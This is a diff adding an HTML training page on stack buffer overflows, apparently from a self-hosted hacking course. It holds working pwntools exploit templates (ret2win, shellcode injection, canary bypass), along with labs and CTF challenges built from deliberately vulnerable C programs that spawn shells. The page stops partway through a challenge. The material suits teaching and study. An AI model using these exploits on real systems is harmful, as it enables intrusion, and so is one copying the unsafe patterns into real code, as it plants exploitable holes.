@@ -1,0 +1,1126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Stack Overflow</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-nasm.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Stack Buffer Overflow</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+        <h2>The Vulnerability</h2>
+        <p>C doesn't check array bounds. Writing more data than a buffer can hold overwrites adjacent memory — including the <strong>return address</strong>.</p>
+<pre><code class="language-c">void vulnerable() {
+    char buf[64];
+    gets(buf);       // reads unlimited input → overflow!
+}</code></pre>
+
+        <h3>Stack Layout During Overflow</h3>
+<pre><code class="language-nasm">Low addresses                              High addresses
+┌──────────┬──────────┬──────────┬──────────┐
+│ buf[64]  │  CANARY  │ saved RBP│ RET ADDR │
+└──────────┴──────────┴──────────┴──────────┘
+← input flows this direction →→→→→→→→→→→→→→→
+                                   ↑
+                            overwrite this to hijack control flow</code></pre>
+
+        <p>When the function executes <code>ret</code>, it pops the overwritten return address into RIP → you control execution.</p>
+
+        <h2>Finding the Offset</h2>
+        <h3>Method 1: Cyclic Pattern</h3>
+<pre><code class="language-python">from pwn import *
+
+# Generate unique pattern
+pattern = cyclic(200)
+# Send it to binary, it crashes
+# In GDB check RSP value at crash:
+offset = cyclic_find(0x6161616c)  # e.g., returns 72</code></pre>
+
+        <h3>Method 2: Manual Calculation</h3>
+<pre><code class="language-nasm"># Without canary:
+# buf[64] + saved_rbp[8] = 72 bytes before ret addr
+
+# With canary:
+# buf[64] + canary[8] + saved_rbp[8] = 80 bytes before ret addr
+
+# Verify in GDB:
+# b *vulnerable+XX  (after buffer write)
+# x/20gx $rsp
+# Count qwords from buffer start to return address</code></pre>
+
+        <h3>Method 3: GDB Pattern</h3>
+<pre><code class="language-bash"># pwndbg
+pwndbg> cyclic 200        # generate pattern
+pwndbg> r                  # run, paste pattern
+pwndbg> cyclic -l $rsp    # find offset from crash RSP</code></pre>
+
+        <h2>Exploit Patterns</h2>
+        <h3>ret2win — Jump to Existing Function</h3>
+<pre><code class="language-python">from pwn import *
+
+elf = ELF('./binary')
+p = process('./binary')
+
+offset = 72
+payload = b'A' * offset
+payload += p64(elf.symbols['win'])
+
+p.sendline(payload)
+p.interactive()</code></pre>
+
+        <h3>ret2win with Stack Alignment</h3>
+        <p>On x86_64, the stack must be <strong>16-byte aligned</strong> before a <code>call</code>. If your exploit crashes with SIGSEGV inside libc (movaps instruction), add a <code>ret</code> gadget:</p>
+<pre><code class="language-python">ret = rop.find_gadget(['ret']).address
+
+payload = b'A' * offset
+payload += p64(ret)              # alignment gadget
+payload += p64(elf.symbols['win'])</code></pre>
+
+        <h3>ret2shellcode — NX Disabled</h3>
+<pre><code class="language-python">from pwn import *
+context.arch = 'amd64'
+
+shellcode = asm(shellcraft.sh())
+buf_addr = 0x7fffffffe000  # leaked or known address of buffer
+
+offset = 72
+payload = shellcode
+payload += b'\x90' * (offset - len(shellcode))  # NOP sled to fill
+payload += p64(buf_addr)                         # jump to shellcode
+
+p.sendline(payload)</code></pre>
+
+        <h3>Dealing with Canaries</h3>
+<pre><code class="language-python"># Leak canary via format string or other info leak
+# Canary always ends in \x00 (null byte)
+
+canary = u64(leaked_bytes)  # leaked 8 bytes
+
+payload = b'A' * 64         # fill buffer
+payload += p64(canary)      # preserve canary
+payload += b'B' * 8         # saved RBP
+payload += p64(win_addr)    # overwrite ret</code></pre>
+
+        <h2>Common Pitfalls</h2>
+        <table>
+          <tr><th>Issue</th><th>Solution</th></tr>
+          <tr><td>SIGSEGV in <code>system()</code></td><td>Stack alignment — add a <code>ret</code> gadget before target</td></tr>
+          <tr><td>Null bytes in address</td><td>Use addresses without nulls, or use <code>scanf</code>/<code>read</code> which don't stop at null</td></tr>
+          <tr><td>Input function limitations</td><td><code>gets</code>: stops at newline. <code>scanf(%s)</code>: stops at whitespace. <code>read</code>: reads exact N bytes including nulls</td></tr>
+          <tr><td>ASLR — address changes each run</td><td>Need a leak first, or use non-PIE binary addresses</td></tr>
+          <tr><td>Binary reads fixed number of bytes</td><td>Check if the buffer size is big enough for your payload; may need multi-stage</td></tr>
+        </table>
+
+        <h2>Exploit Template</h2>
+<pre><code class="language-python">#!/usr/bin/env python3
+from pwn import *
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+binary = './vuln'
+elf = ELF(binary)
+rop = ROP(elf)
+
+# Connect
+if args.REMOTE:
+    p = remote('host', port)
+else:
+    p = process(binary)
+
+# Find offset (update after testing)
+offset = 72
+
+# Build payload
+payload = flat(
+    b'A' * offset,
+    rop.find_gadget(['ret']).address,    # stack alignment
+    elf.symbols['win'],                   # target function
+)
+
+# Send
+p.sendlineafter(b'> ', payload)
+p.interactive()</code></pre>
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Basic Overflow — ret2win</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Overflow a buffer to redirect execution to a win function.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// overflow1.c
+// gcc -o overflow1 overflow1.c -fno-stack-protector -no-pie -z noexecstack
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() {
+    system("cat flag.txt");
+}
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    gets(buf);
+}
+
+int main() {
+    vuln();
+    printf("Normal return\n");
+    return 0;
+}</code></pre>
+            <p><strong>Steps:</strong></p>
+            <ol>
+              <li>Create <code>flag.txt</code> with <code>echo "FLAG{got_it}" > flag.txt</code></li>
+              <li>Find offset: <code>buf[64]</code> + saved_rbp<code>[8]</code> = 72</li>
+              <li>Find <code>win</code> address: <code>objdump -d overflow1 | grep win</code></li>
+              <li>Build exploit with pwntools</li>
+              <li>Don't forget stack alignment if it crashes!</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: Offset Discovery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Use cyclic patterns to determine the exact overflow offset when you don't know the buffer size.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// overflow2.c
+// gcc -o overflow2 overflow2.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void secret() {
+    printf("FLAG{offset_master}\n");
+}
+
+void vuln() {
+    char mystery_buf[???]; // size unknown to attacker
+    printf("Speak: ");
+    gets(mystery_buf);
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> Compile with a random buffer size (e.g., 48, 96, 128). Then use cyclic patterns in pwntools or GDB to find the offset without looking at source.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Stack Alignment</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a binary where naive ret2win crashes due to movaps alignment.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// overflow3.c
+// gcc -o overflow3 overflow3.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void reward() {
+    printf("Almost there...\n");
+    system("/bin/sh");    // uses movaps internally — needs alignment!
+}
+
+void vuln() {
+    char buf[80];
+    printf(">> ");
+    gets(buf);
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> First attempt will likely crash inside <code>system()</code>. Debug in GDB to see the movaps crash, then fix with a <code>ret</code> gadget.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Canary Leak + Overflow</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Leak the stack canary via an info leak, then overflow past it.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// overflow4.c
+// gcc -o overflow4 overflow4.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    printf("Leak: ");
+    read(0, buf, 200);   // first input - can leak canary
+    printf("Echo: %s\n", buf);  // printf stops at null, but canary starts with \x00...
+
+    printf("Exploit: ");
+    read(0, buf, 200);   // second input - overflow with known canary
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+            <p><strong>Hint:</strong> The canary starts with a null byte. If you fill the buffer right up to (and including) the null byte of the canary, printf will print past it, leaking the remaining 7 bytes.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 5: PIE Leak + Overflow</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a PIE binary by parsing a leaked code pointer, computing the base, and overflowing to win().</p>
+          <div class="setup-code">
+<pre><code class="language-c">// pie_overflow.c
+// gcc -o pie_overflow pie_overflow.c -fno-stack-protector -pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    printf("win @ %p\n", win);  // leak a PIE address
+    printf("Input: ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Steps:</strong></p>
+            <ol>
+              <li>Parse the leaked <code>win</code> address from output</li>
+              <li>Calculate PIE base: <code>leak - elf.symbols['win']</code></li>
+              <li>Update ELF base: <code>elf.address = base</code></li>
+              <li>Overflow with recalculated <code>win</code> address</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Partial Overwrite</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a PIE binary by overwriting only the lowest 2 bytes of the return address — no full leak needed.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// partial.c
+// gcc -o partial partial.c -fno-stack-protector -pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    read(0, buf, 74);  // overflows exactly 2 bytes into return address
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Task:</strong> Low 12 bits of PIE addresses are fixed. Overwrite 2 bytes (16 bits) — 12 bits are known, 4 bits require brute force (1/16 chance). Run exploit in a loop until it hits.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: Environment Variable Overflow</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Trigger a stack overflow through an environment variable instead of stdin.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// envoverflow.c
+// gcc -o envoverflow envoverflow.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void win() { system("/bin/sh"); }
+
+int main() {
+    char buf[64];
+    char *env = getenv("EXPLOIT");
+    if (env) {
+        strcpy(buf, env);  // no length check on env var
+    }
+    printf("Done\n");
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> Set the <code>EXPLOIT</code> environment variable to your payload and run the binary. Note: <code>strcpy</code> stops at null bytes, so addresses with <code>\x00</code> will truncate your payload.</p>
+<pre><code class="language-bash">EXPLOIT=$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xef\xbe\xad\xde')") ./envoverflow</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: one_gadget Usage</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Use a libc leak to find and jump to a one_gadget — a single address that spawns a shell with no ROP chain.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// onegadget.c
+// gcc -o onegadget onegadget.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vuln() {
+    char buf[64];
+    printf("puts @ %p\n", puts);  // leak libc address
+    printf("Input: ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Steps:</strong></p>
+            <ol>
+              <li>Parse leaked <code>puts</code> address → compute libc base</li>
+              <li>Run <code>one_gadget /lib/x86_64-linux-gnu/libc.so.6</code> to find candidates</li>
+              <li>Overflow return address to <code>libc_base + one_gadget_offset</code></li>
+              <li>If first gadget fails (constraint not met), try the next one</li>
+            </ol>
+<pre><code class="language-python">libc_base = leaked_puts - libc.symbols['puts']
+one_gadget = libc_base + 0xe3b01  # offset from one_gadget tool
+payload = b'A' * 72 + p64(one_gadget)</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: argv Overflow</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Exploit a buffer overflow triggered by a command-line argument instead of stdin.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// argvoverflow.c
+// gcc -o argvoverflow argvoverflow.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void win() { system("/bin/sh"); }
+
+int main(int argc, char **argv) {
+    char buf[64];
+    if (argc &gt; 1) {
+        strcpy(buf, argv[1]);  // overflow via command-line argument
+    }
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> Pass payload as argv[1]. Watch out: <code>strcpy</code> stops at null bytes. Use pwntools <code>process(argv=[...])</code> or shell command substitution:</p>
+<pre><code class="language-python">p = process(['./argvoverflow', payload])
+# Or from shell:
+# ./argvoverflow $(python3 -c "print('A'*72 + '\xef\xbe')")</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: read() vs gets() Differences</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Understand how different input functions affect exploit payload construction — especially null byte and newline handling.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// readvsgets.c
+// gcc -o readvsgets readvsgets.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln_gets() {
+    char buf[64];
+    printf("gets: ");
+    gets(buf);  // stops at \n, can't send \x00
+}
+
+void vuln_read() {
+    char buf[64];
+    printf("read: ");
+    read(0, buf, 200);  // reads exact bytes, including \x00 and \n
+}
+
+int main() {
+    int c;
+    printf("1) gets  2) read: ");
+    scanf("%d", &amp;c);
+    if (c == 1) vuln_gets();
+    else vuln_read();
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> Exploit both paths. Key differences:</p>
+            <table>
+              <tr><th>Function</th><th>Stops at</th><th>Null bytes</th><th>pwntools</th></tr>
+              <tr><td><code>gets()</code></td><td><code>\n</code></td><td>Terminates</td><td><code>sendline()</code></td></tr>
+              <tr><td><code>read()</code></td><td>N bytes</td><td>Allowed</td><td><code>send()</code></td></tr>
+            </table>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Multi-Function Overflow Chain</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Build a ROP chain that passes arguments to a function before calling it — chaining multiple gadgets together.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// chain.c
+// gcc -o chain chain.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void unlock(char *key) {
+    if (strcmp(key, "UNLOCKED") == 0)
+        system("/bin/sh");
+    else
+        printf("Wrong key\n");
+}
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Task:</strong> Find the string "UNLOCKED" in the binary or place it in your payload. Use <code>pop rdi; ret</code> to set RDI to its address, then return to <code>unlock</code>.</p>
+<pre><code class="language-bash"># Find string in binary
+strings -t x chain | grep UNLOCKED
+# Find gadgets
+ROPgadget --binary chain | grep "pop rdi"</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Integer Overflow → Buffer Overflow</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Bypass a length check using a signed/unsigned integer mismatch to trigger a buffer overflow.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// intoverflow.c
+// gcc -o intoverflow intoverflow.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[128];
+    int len;
+    printf("Length: ");
+    scanf("%d", &amp;len);
+    if (len &gt; 128) {
+        printf("Too long!\n");
+        return;
+    }
+    printf("Data: ");
+    read(0, buf, (unsigned int)len);  // signed → unsigned cast!
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Task:</strong> Provide a negative length (e.g., <code>-1</code>). It passes the <code>len &gt; 128</code> check (since -1 &lt; 128). But cast to <code>unsigned int</code>, -1 becomes <code>4294967295</code>. Now <code>read()</code> accepts way more than 128 bytes.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: Off-by-One — RBP Last Byte Overwrite</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit an off-by-one that corrupts the LSB of saved RBP, redirecting the stack frame on return.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// offbyone.c
+// gcc -o offbyone offbyone.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    read(0, buf, 65);  // off-by-one: writes 1 byte into saved RBP
+}
+
+void wrapper() {
+    vuln();
+}
+
+int main() {
+    wrapper();
+    return 0;
+}</code></pre>
+            <p><strong>Task:</strong> The 65th byte overwrites saved RBP's LSB. When <code>wrapper</code> executes <code>leave</code> (<code>mov rsp, rbp; pop rbp</code>), the corrupted RBP shifts RSP. Place a fake return address in your buffer where the shifted RSP will pop from. Use GDB to map exact byte positions.</p>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 14: Fork Server Brute Force</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Brute-force a stack canary byte-by-byte using a forking server where the canary stays constant across children.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// forkserver.c
+// gcc -o forkserver forkserver.c -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/wait.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+void vuln() {
+    char buf[32];
+    printf("&gt; ");
+    fflush(stdout);
+    read(0, buf, 256);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    while (1) {
+        pid_t pid = fork();
+        if (pid == 0) { vuln(); exit(0); }
+        else {
+            int s;
+            wait(&amp;s);
+            if (WIFSIGNALED(s)) printf("crash\n");
+            else printf("ok\n");
+            fflush(stdout);
+        }
+    }
+}</code></pre>
+            <p><strong>Steps:</strong></p>
+            <ol>
+              <li>Canary byte 0 is always <code>\x00</code></li>
+              <li>For bytes 1–7: send <code>buf[32] + \x00 + known_bytes + guess_byte</code></li>
+              <li>"ok" → correct byte, "crash" → wrong byte</li>
+              <li>Max 256 attempts per byte × 7 bytes = 1792 connections</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 15: 32-bit vs 64-bit Calling Convention</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Exploit the same vulnerable code compiled for both architectures to understand calling convention differences.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// bof_both.c
+// 32-bit: gcc -m32 -o bof32 bof_both.c -fno-stack-protector -no-pie
+// 64-bit: gcc -o bof64 bof_both.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win(int a, int b) {
+    if (a == 0xdeadbeef &amp;&amp; b == 0xcafebabe)
+        system("/bin/sh");
+}
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>32-bit payload (args on stack):</strong></p>
+<pre><code class="language-python">payload = b'A'*76 + p32(elf.symbols['win']) + p32(0) + p32(0xdeadbeef) + p32(0xcafebabe)</code></pre>
+            <p><strong>64-bit payload (args in registers via ROP):</strong></p>
+<pre><code class="language-python">payload = b'A'*72 + p64(pop_rdi) + p64(0xdeadbeef) + p64(pop_rsi_r15) + p64(0xcafebabe) + p64(0) + p64(elf.symbols['win'])</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 16: BOF with Restricted Character Set</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Exploit a buffer overflow where a filter rejects bytes above 0x7f — all payload bytes must be ASCII-printable.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// restricted.c
+// gcc -o restricted restricted.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void win() { system("/bin/sh"); }
+
+void vuln() {
+    char buf[64];
+    printf("Input: ");
+    fgets(buf, 256, stdin);
+    for (int i = 0; i &lt; strlen(buf); i++) {
+        if ((unsigned char)buf[i] &gt; 0x7f) {
+            printf("Bad character at %d!\n", i);
+            exit(1);
+        }
+    }
+}
+
+int main() { vuln(); return 0; }</code></pre>
+            <p><strong>Task:</strong> Find gadgets and addresses composed only of bytes ≤ 0x7f. Techniques:</p>
+            <ul>
+              <li><code>ROPgadget --binary restricted | grep -v '[\x80-\xff]'</code></li>
+              <li>Use partial overwrites if <code>win</code> has high bytes</li>
+              <li>Chain sub/xor gadgets to construct needed values from ASCII-safe bytes</li>
+              <li>Leverage <code>strlen()</code> stopping at null — place a <code>\x00</code> before restricted bytes so filter doesn't reach them</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Login Bypass</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A login system checks credentials. Can you bypass it without knowing the password?</p>
+          <div class="setup-code">
+<pre><code class="language-c">// login.c - gcc -o login login.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int check_auth() {
+    int authenticated = 0;
+    char password[32];
+    printf("Password: ");
+    gets(password);
+    if (strcmp(password, "sup3rs3cr3t") == 0) {
+        authenticated = 1;
+    }
+    return authenticated;
+}
+
+int main() {
+    if (check_auth()) {
+        printf("FLAG{overflow_the_auth}\n");
+    } else {
+        printf("Access Denied.\n");
+    }
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>You don't need the password. The <code>authenticated</code> variable is on the stack near <code>password</code>. Overflow <code>password</code> to overwrite <code>authenticated</code> to any non-zero value. Note: due to stack ordering, <code>authenticated</code> might be at a lower address — check with GDB.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: Shellcode Injection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">NX is disabled. Inject and execute shellcode to get a shell.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// shellcode_me.c
+// gcc -o shellcode_me shellcode_me.c -fno-stack-protector -no-pie -z execstack
+#include &lt;stdio.h&gt;
+
+int main() {
+    char buf[256];
+    printf("Buffer at: %p\n", buf);
+    printf("Shellcode: ");
+    gets(buf);
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The binary leaks the buffer address and NX is disabled (-z execstack). Place shellcode at the start of buf, pad to the return address offset, then overwrite ret with the leaked buffer address. Use <code>asm(shellcraft.sh())</code> for shellcode.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Multi-Stage Overflow</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The buffer is too small for a full ROP chain. Use a stack pivot or multi-stage approach.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// multistage.c
+// gcc -o multistage multistage.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+char big_buf[0x1000];  // .bss - known address, writable
+
+void vuln() {
+    char small[16];  // tiny buffer - only room for 1-2 gadgets after overflow
+    printf("Stage1: ");
+    gets(small);
+}
+
+int main() {
+    printf("big_buf @ %p\n", big_buf);
+    printf("Read to big_buf: ");
+    read(0, big_buf, 0x1000);   // read large payload into .bss
+    vuln();
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Stage 1: Read a full ROP chain into <code>big_buf</code> (bss, known address since no PIE). Stage 2: Overflow <code>small</code> with a stack pivot gadget (<code>pop rsp; ret</code> or <code>leave; ret</code> with controlled RBP) that redirects RSP to <code>big_buf</code>. Execution continues with your ROP chain in bss.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: ret2win with Arguments</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The flag function requires two magic arguments. Can you call it correctly?</p>
+          <div class="setup-code">
+<pre><code class="language-c">// ret2win_args.c
+// gcc -o ret2win_args ret2win_args.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void flag(long magic1, long magic2) {
+    if (magic1 == 0x1337 &amp;&amp; magic2 == 0x7331) {
+        system("cat flag.txt");
+    } else {
+        printf("Wrong args!\n");
+    }
+}
+
+void vuln() {
+    char buf[48];
+    printf("&gt;&gt; ");
+    gets(buf);
+}
+
+int main() { vuln(); return 0; }</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>You need ROP gadgets to load registers: <code>pop rdi; ret</code> for magic1 and <code>pop rsi; r15; ret</code> (or <code>pop rsi; ret</code>) for magic2. Chain: <code>padding + pop_rdi + 0x1337 + pop_rsi_r15 + 0x7331 + 0 + flag</code>. Find gadgets with <code>ROPgadget --binary ret2win_args</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: BOF in Network Service</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Exploit a buffer overflow in a binary served over TCP. Same overflow, different I/O.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// vuln_service.c
+// gcc -o vuln_service vuln_service.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() { system("cat flag.txt"); }
+
+void vuln() {
+    char buf[64];
+    read(0, buf, 256);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+<pre><code class="language-python"># server.py — wrap binary over TCP
+import subprocess, socket, threading
+def handle(conn):
+    proc = subprocess.Popen(['./vuln_service'], stdin=subprocess.PIPE,
+                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    data = conn.recv(4096)
+    proc.stdin.write(data); proc.stdin.flush()
+    out = proc.stdout.read()
+    conn.send(out); conn.close()
+
+s = socket.socket(); s.bind(('0.0.0.0', 9999)); s.listen(5)
+while True:
+    conn, _ = s.accept()
+    threading.Thread(target=handle, args=(conn,)).start()</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>remote('localhost', 9999)</code> instead of <code>process()</code>. The exploit payload is identical to a local overflow. Key difference: output arrives over the socket, and you can't attach GDB directly to the child process. Debug locally first, then switch to remote.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Canary Brute Force (Fork Server)</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
